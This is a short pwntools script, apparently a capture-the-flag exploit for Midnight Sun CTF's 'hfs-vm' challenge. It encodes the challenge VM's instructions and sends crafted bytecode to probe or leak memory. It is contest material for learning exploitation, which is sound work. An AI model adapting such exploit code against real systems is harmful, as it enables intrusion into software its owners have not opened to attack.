#!/usr/bin/env python
# coding=utf-8

from struct import pack
from pwn import *

def push(n, is_imm=1):
    res = 5
    if is_imm:
        res |= 0x2000
        res |= n << 16
    else:
        res |= n << 5
    return p32(res)

def pop(a):
    res = 6 | (a<<5)
    return p32(res)

def mov(a, b, is_imm=1):
    res = 0 | (a<<5)
    if is_imm:
        res |= 0x2000
        res |= b << 16
    else:
        res |= b << 9
    return p32(res)

def add(a, b, is_imm=1):
    res = 1 | (a<<5)
    if is_imm:
        res |= 0x2000
        res |= b << 16
    else:
        res |= b << 9
    return p32(res)

def syscall():
    return p32(9)

def show():
    return mov(1, 1) + syscall()

def load(a, b):
    res = 8 | (a<<5) | (b<<9)
    return p32(res)

def store(a, b, is_imm=1):
    res = 7 | (a<<5)
    if is_imm:
        res |= 0x2000
        res |= b << 16
    else:
        res |= b << 9
    return p32(res)

def evil_load(n):
    return mov(1, n) + load(0, 1) + push(0, 0)

if __name__ == '__main__':
    r = process('./hfs-vm')
    # r = remote('hfs-vm-01.play.midnightsunctf.se', 4096)

    code = push(0x4142)*16 + mov(1, 3) + syscall() + show()

    r.sendlineafter(': ', str(len(code)))
    r.sendafter(': ', code)
    log.info(r.recvline())
    log.info(r.recvline())
